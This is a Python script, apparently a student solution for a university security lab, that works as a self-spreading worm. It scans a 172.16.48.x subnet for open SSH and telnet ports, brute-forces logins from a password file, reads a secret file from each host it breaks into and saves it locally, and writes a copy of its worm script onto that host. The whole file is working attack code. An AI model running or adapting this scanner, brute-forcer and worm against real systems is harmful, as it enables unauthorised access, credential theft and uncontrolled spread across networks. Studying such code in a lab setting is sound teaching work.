import paramiko
import telnetlib
import socket
import os
import time


DIRECTORY = '/home/cse/Lab2/Solutions'


def is_port_open(host, port): # checks if portal is open
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.settimeout(1)
  result = sock.connect_ex((host, port))
  sock.close()
  return result == 0
  
  
def sshs_and_telnets():# checks every IP address and adds it to files
  sshs, tels = [], []
  for i in range(0,256):
    host = f"172.16.48.{i}" # every IP address
    print(f'testing {host}')
    if is_port_open(host, 22): # check SSH port
      with open("/home/cse/Lab2/sshs.txt") as f:
        f.write(f'{host}\n')
      sshs.append(host)
      print(f'success: {host} is an open ssh port')
    if is_port_open(host, 23): # check telnet port
      with open("/home/cse/Lab2/tels.txt") as f:
        f.write(f'{host}\n')
      tels.append(host)
      print(f'success: {host} is an open telnet port')
  return sshs, tels


if __name__ == "__main__":
  
  # def sshs_and_telnets() only needs to run once
  
  # the usernames and passwords
  with open("/home/cse/Lab2/Q2pwd") as f:
    pwds = [line.rstrip('\n') for line in f]
  f.close()
  
  # the ip addresses for sshing
  with open("/home/cse/Lab2/Solutions/sshs.txt") as f:
    sshs = [line.rstrip('\n') for line in f]
  f.close()
  
  # the ip addresses for telnetting
  with open("/home/cse/Lab2/Solutions/telnets.txt") as f:
    tels = [line.rstrip('\n') for line in f]
  f.close()
  
  # telnet
  for host in tels:
    for i in pwds:
      users = i.split()
      u = users[0]
      p = users[1]
      try:
        print(f'testing {host} with {u} {p}')
        tn = telnetlib.Telnet(host, timeout = 0.5)
        tn.read_until(b'cse3140-HVM-domU login: ')
        tn.write(u.encode('ascii') + b'\n')
        tn.read_until(b'Password: ')
        tn.write(p.encode('ascii') + b'\n')
        
        if b'Welcome' in tn.read_until(b'Welcome ', timeout = 0.5):
          print(f'success: found {u} {p}')
          tn.read_until(b'$')
          tn.write(b'cat Q2secret\n')
          tn.read_until(b'\n')
          f = open('Q2secrets', 'a')
          f.write(tn.read_until(b'\n').decode('ascii'))
          f.close()
          tn.read_until(b'$')
          
          f = open('Q2worm.py', 'r')
          tn.write(b'echo \x27')
          tn.write(f.read().replace('\x5c', '\x5c\x5c').encode('ascii'))
          tn.write(b'\x27 > Q2worm.py\n')
          tn.read_until(b'$')
          
          tn.write(b'exit\n')
          tn.close()
          
      except socket.timeout:
        print('socket timeout')
        break
      except EOFError:
        print('EOF error')
        break
      except ConnectionRefusedError:
        print('connection refused error')
        break
      except TimeoutError:
        print('timeout timeout')
        break
      except paramiko.SSHException:
        print('SSH exception')
        pass
  
  # ssh
  client = paramiko.client.SSHClient()
  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  for host in sshs:
    for i in pwds:
      x = i.split()
      u = x[0]
      p = x[1]
      try:
        print(f'testing {host} with {u} {p}')
        client.connect(host, username = u, password = p, timeout = 2, banner_timeout = 2)
        print(f'found {u} {p}')
        _in, _out, _err = client.exec_command('cat Q2secret')
        f = open('/home/cse/Lab2/Solutions/Q2secrets', 'a')
        f.write(_out.read().decode())
        f.close()
        
        f = open('Q2worm.py', 'r')
        _in, _out, _err = client.exec_command('cat > Q2worm.py')
        _in.write(f.read())
        _in.close()
        
      except paramiko.ssh_exception.NoValidConnectionsError:
        break
      except socket.timeout:
        break
      except TimeoutError:
        break
      except paramiko.SSHException:
        pass